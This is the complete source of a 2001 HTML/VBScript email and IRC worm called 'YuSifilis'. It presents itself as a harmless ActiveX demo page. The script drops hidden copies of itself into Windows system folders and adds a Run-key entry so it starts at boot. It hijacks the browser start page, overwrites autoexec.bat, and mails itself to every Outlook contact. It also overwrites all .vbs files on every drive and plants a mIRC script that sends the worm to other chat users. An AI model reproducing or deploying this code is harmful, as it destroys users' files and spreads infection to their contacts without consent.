<YuSifilis / acidcookie / vxbiolabs / 26.08.2001>
<Kad izgleda da se radja ono ustvari umire / VxBioLabs / Specie and ACIdCooKie>
<HTML><HEAD><TITLE>The file use ActiveX , press "YES" to see the page...</TITLE></HEAD>
<BODY bgColor=#FFFFFF>
<marquee>ActiveX - Copyright (c) 1997 Microsoft Corporation.&nbsp; All Rights
Reserved.</marquee>
<br><hr>

<SCRIPT language=VBScript>
on error resume next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")

Set original=document.body.createTextRange
 Set kopiraj=fso.CreateTextFile(fso.GetSpecialFolder(0)&"\Kernel32.dll")
 Set kopirajm=fso.CreateTextFile(fso.GetSpecialFolder(1)&"\SEX_za_neupucene.htm")
 Set kopirajme=fso.CreateTextFile(fso.GetSpecialFolder(1)&"\mntask.tsk")
  kopirajme.WriteLine "<YuSifilis / acidcookie / vxbiolabs>"
  kopirajme.WriteLine "<HTML><HEAD><TITLE>ActiveX Demo file...</TITLE></HEAD>"
  kopirajme.WriteLine "<BODY bgColor=#000000>"
  kopirajme.WriteLine original.htmltext
  kopirajme.WriteLine "</BODY></HTML>"
kopirajme.Close()
  kopirajm.WriteLine "<YuSifilis / acidcookie / vxbiolabs>"
  kopirajm.WriteLine "<HTML><HEAD><TITLE>The file use ActiveX , press"+ Chr(34) + "YES"+ Chr(34) + "to see the page...</TITLE></HEAD>"
  kopirajm.WriteLine "<BODY bgColor=#FFFFFF>"
  kopirajm.WriteLine original.htmltext
  kopirajm.WriteLine "</BODY></HTML>"
kopirajm.Close()
  kopiraj.WriteLine "<YuSifilis / acidcookie / vxbiolabs>"
  kopiraj.WriteLine "<HTML><HEAD><TITLE>The file use ActiveX , press"+ Chr(34) + "YES"+ Chr(34) + "to see the page...</TITLE></HEAD>"
  kopiraj.WriteLine "<BODY bgColor=#FFFFFF>"
  kopiraj.WriteLine original.htmltext
  kopiraj.WriteLine "</BODY></HTML>"
kopiraj.Close()

ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","www.vxbiolabs.cjb.net"
ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "silifisuy", (fso.GetSpecialFolder(1) & "\yusifilis.vbs")
dim f
 Set f = fso.GetFile(fso.GetSpecialFolder(1)&"\mntask.tsk")
 f.attributes = f.attributes + 2
 Set f = fso.GetFile(fso.GetSpecialFolder(1)&"\SEX_za_neupucene.htm")
 f.attributes = f.attributes + 2
 Set f = fso.GetFile("C:\silifisuy.vbs")
 f.attributes = f.attributes + 2

Set porukica= fso.CreateTextFile("C:\autoexec.bat", True, False)
 porukica.Write(tout)
 porukica.WriteLine "@echo off"
 porukica.WriteLine "echo Ja sam lepa , zgodna , pametna i uobrazena"
 porukica.WriteLine "echo Ja sam kompljuterski crv i virus 'YuSifilis'"
 porukica.WriteLine "echo ------------------------------------------"
 porukica.WriteLine "echo Moj bog koji me stvorio je ACIdCooKie / clan VxBioLabs"
 porukica.WriteLine "echo Kad sve izgleda da umire, ono se ustvari radja..."
 porukica.WriteLine "echo Mi u BOG-a verujemo - Specie & ACIdCooKie"
 porukica.WriteLine "echo Greets: VIRUSKREW , BihNet.org , #vxers , 29A ,"
 porukica.WriteLine "echo vtc.cjb.net , and all VX coderz..."
 porukica.WriteLine "pause <nul"
porukica.Close()

Dim Mail, cAddresses, Address, App, MAPI
Set App = CreateObject("Outlook.Application")
Set MAPI = App.GetNameSpace("MAPI")
For Each cAddresses In MAPI.AddressLists
	For Each Address In cAddresses.AddressEntries
		Set Mail = App.CreateItem(0)
		Mail.Recipients.Add Address
		Mail.Subject = "Jao pogledaj ovo pa ovo je za umreti od smeha..."
		Mail.Body = "Hmm novi pokreti , sve novo , ovo je stvarno mocno :) morao sam sa nekim ovo da podelim ... saljem ti... haha e drzi se za stolicu da nebi pao sa nje od smeha hehe :) sta sve ljudi znaju da pisu pa to je neverovatno... BYE"
                Mail.Attachments.Add(fso.GetSpecialFolder(1) & "\SEX_za_neupucene.htm")
		Mail.Send
Next
Next

Set porukica1= fso.CreateTextFile(fso.GetSpecialFolder(1) & "\yusifilis.vbs", True, False)
 porukica1.Write(tout)
 porukica1.WriteLine "'VBS.YuSifilis"
 porukica1.WriteLine "'coded by ACIdCooKie / www.vxbiolabs.cjb.net"
 porukica1.WriteLine "'Specie and ACIdCooKie"
 porukica1.WriteLine "on error resume next"
 porukica1.WriteLine "Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder "
 porukica1.WriteLine "Set Fso=createobject(" + Chr(34) + "scripting.filesystemobject" + Chr(34) + ")" 
 porukica1.WriteLine "Set w = fso.GetFile(WScript.ScriptFullName)"
 porukica1.WriteLine "w.Copy (" + Chr(34) + "C:\silifisuy.vbs" + Chr(34) + ")"
 porukica1.WriteLine "w.Copy (fso.GetSpecialFolder(1) & " + Chr(34) + "\yusifilis.vbs" + Chr(34) + ")"
 porukica1.WriteLine "Set w1 = fso.GetFile(fso.GetSpecialFolder(1)&" + Chr(34) + "\mntask.tsk" + Chr(34) + ")"
 porukica1.WriteLine "w1.Copy (fso.GetSpecialFolder(0) & " + Chr(34) + "\ActiveX_Demo_file.htm" + Chr(34) + ")"
 porukica1.WriteLine "Set w2 = fso.GetFile(fso.GetSpecialFolder(0)&" + Chr(34) + "\Kernel32.dll" + Chr(34) + ")"
 porukica1.WriteLine "w2.Copy (fso.GetSpecialFolder(1) & " + Chr(34) + "\SEX_za_neupucene.htm" + Chr(34) + ")"
 porukica1.WriteLine ""
 porukica1.WriteLine " Set f = fso.GetFile(" + Chr(34) + "C:\silifisuy.vbs" + Chr(34) + ")"
 porukica1.WriteLine " f.attributes = f.attributes + 2"
 porukica1.WriteLine " Set f = fso.GetFile(fso.GetSpecialFolder(1) & " + Chr(34) + "\SEX_za_neupucene.htm" + Chr(34) + ")"
 porukica1.WriteLine " f.attributes = f.attributes + 2"
 porukica1.WriteLine "Set vrc1 = CreateObject(" + Chr(34) + "WScript.Shell" + Chr(34) + ")"
 porukica1.WriteLine ""
 porukica1.WriteLine "Randomize"
 porukica1.WriteLine "num = Int((2 * Rnd) + 1)"
 porukica1.WriteLine "if num = 1 then"
 porukica1.WriteLine "url ="  + Chr(34) + "http://www.vxbiolabs.cjb.net"  + Chr(34)
 porukica1.WriteLine "elseif num = 2 then"
 porukica1.WriteLine "url = fso.GetSpecialFolder(0)&" + Chr(34) + "\ActiveX_Demo_file.htm" + Chr(34)
 porukica1.WriteLine "end if"
 porukica1.WriteLine ""
 porukica1.WriteLine "vrc1.RegWrite " + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page" + Chr(34) + ", url"
 porukica1.WriteLine "vrc1.RegWrite " + Chr(34) + "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page" + Chr(34) + ", url"
 porukica1.WriteLine ""
 porukica1.WriteLine "vrc1.RegWrite " + Chr(34) + "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" + Chr(34) + " & " + Chr(34) + "silifisuy" + Chr(34) + ", (fso.GetSpecialFolder(1) & " + Chr(34) + "\yusifilis.vbs" + Chr(34) + ")"
 porukica1.WriteLine ""
 porukica1.WriteLine "Set Drives=fso.drives"
 porukica1.WriteLine "For Each Drive in Drives"
 porukica1.WriteLine "If drive.isready then"
 porukica1.WriteLine "Dosearch drive"
 porukica1.WriteLine "end If "
 porukica1.WriteLine "Next "
 porukica1.WriteLine "'coded by ACIdCooKie / www.vxbiolabs.cjb.net"
 porukica1.WriteLine "Function Dosearch(Path) "
 porukica1.WriteLine "Set Folder=fso.getfolder(path) "
 porukica1.WriteLine "Set Files = folder.files "
 porukica1.WriteLine "For Each File in files "
 porukica1.WriteLine "If fso.GetExtensionName(file.path)=" + Chr(34) + "vbs"  + Chr(34) + "Then"
 porukica1.WriteLine "fso.copyfile wscript.scriptfullname, (file.path), True"
 porukica1.WriteLine "end If "
 porukica1.WriteLine "If file.name =" + Chr(34) + "mirc.ini"  + Chr(34) + "then"
 porukica1.WriteLine "Set Script = Fso.CreateTextFile(file.ParentFolder & " + Chr(34) + "\script.ini" + Chr(34) + ", True)"
 porukica1.WriteLine "Script.Writeline " + Chr(34) + "[script]" + Chr(34)
 porukica1.WriteLine "Script.Writeline " + Chr(34) + "n0=;Coded by / acidcookie / www.vxbiolabs.cjb.net" + Chr(34)
 porukica1.WriteLine "Script.Writeline " + Chr(34) + "n1=On 1:JOIN:#:{ /if ( $nick==me ) { halt } " + Chr(34)
 porukica1.WriteLine "Script.Writeline " + Chr(34) + "n2= /dcc send $nick C:\WIN999\SYSTEM\SEX_za_neupucene.htm" + Chr(34)
 porukica1.WriteLine "Script.Writeline " + Chr(34) + "n3= }" + Chr(34)
 porukica1.WriteLine "Script.Writeline " + Chr(34) + "n4=on 1:PART:#:{ /if ( $nick==me ) {halt}" + Chr(34)
 porukica1.WriteLine "Script.writeline " + Chr(34) + "n5= /dcc send $nick C:\silifisuy.vbs" + Chr(34)
 porukica1.WriteLine "Script.Writeline " + Chr(34) + "n6=}" + Chr(34)
 porukica1.WriteLine "Script.Close"
 porukica1.WriteLine "End If "
 porukica1.WriteLine "Next "
 porukica1.WriteLine "Set Subfolders = folder.SubFolders "
 porukica1.WriteLine "For Each Subfolder in Subfolders "
 porukica1.WriteLine "Dosearch Subfolder.path "
 porukica1.WriteLine "Next "
 porukica1.WriteLine "end function"
 porukica1.WriteLine "'end code"
 porukica1.WriteLine "'VBS.YuSifilis"
 porukica1.WriteLine "'coded by ACIdCooKie / vxbiolabs"
 porukica1.WriteLine "'Specie and ACIdCooKie"
 porukica1.Close()


</SCRIPT>
</FONT>
</BODY></HTML>
